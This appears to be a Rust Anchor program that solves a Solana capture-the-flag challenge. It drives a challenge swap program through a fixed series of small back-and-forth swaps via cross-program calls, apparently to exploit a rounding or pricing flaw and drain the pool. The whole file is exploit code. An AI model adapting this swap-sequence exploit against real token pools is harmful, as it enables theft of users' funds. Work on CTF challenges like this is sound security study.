use anchor_lang::prelude::*;

use anchor_spl::token::{Token, TokenAccount};

declare_id!("osecio1111111111111111111111111111111111111");

#[program]
pub mod solve {
    use super::*;

    pub fn initialize(ctx: Context<Initialize>) -> Result<()> {
        let vals = [-7, -1, -1, -1, 4, -13, -1, 1];

        for val in vals {
            let val: i64 = val;
            let cpi_accounts = chall::cpi::accounts::Swap {
                swap: ctx.accounts.swap.clone(),
                payer: ctx.accounts.payer.to_account_info(),
                pool_a: ctx.accounts.pool_a.to_account_info(),
                pool_b: ctx.accounts.pool_b.to_account_info(),

                user_in_account: ctx.accounts.user_in_account.to_account_info(),
                user_out_account: ctx.accounts.user_out_account.to_account_info(),

                token_program: ctx.accounts.token_program.to_account_info(),
            };

            let cpi_ctx = CpiContext::new(ctx.accounts.chall.to_account_info(), cpi_accounts);

            let cpi_accounts2 = chall::cpi::accounts::Swap {
                swap: ctx.accounts.swap.clone(),
                payer: ctx.accounts.payer.to_account_info(),
                pool_a: ctx.accounts.pool_a.to_account_info(),
                pool_b: ctx.accounts.pool_b.to_account_info(),

                user_in_account: ctx.accounts.user_out_account.to_account_info(),
                user_out_account: ctx.accounts.user_in_account.to_account_info(),

                token_program: ctx.accounts.token_program.to_account_info(),
            };

            let cpi_ctx2 = CpiContext::new(ctx.accounts.chall.to_account_info(), cpi_accounts2);

            let dir = val < 0;
            let amt: u64 = val.abs().try_into().unwrap();

            chall::cpi::swap(if dir { cpi_ctx } else { cpi_ctx2 }, amt, dir)?;
        }

        Ok(())
    }
}

#[derive(Accounts)]
pub struct Initialize<'info> {
    pub swap: AccountInfo<'info>,
    #[account(mut)]
    pub pool_a: Account<'info, TokenAccount>,
    #[account(mut)]
    pub pool_b: Account<'info, TokenAccount>,

    #[account(mut)]
    pub user_in_account: Account<'info, TokenAccount>,
    #[account(mut)]
    pub user_out_account: Account<'info, TokenAccount>,

    #[account(mut)]
    pub payer: Signer<'info>,
    pub token_program: Program<'info, Token>,

    pub chall: Program<'info, chall::program::Chall>
}
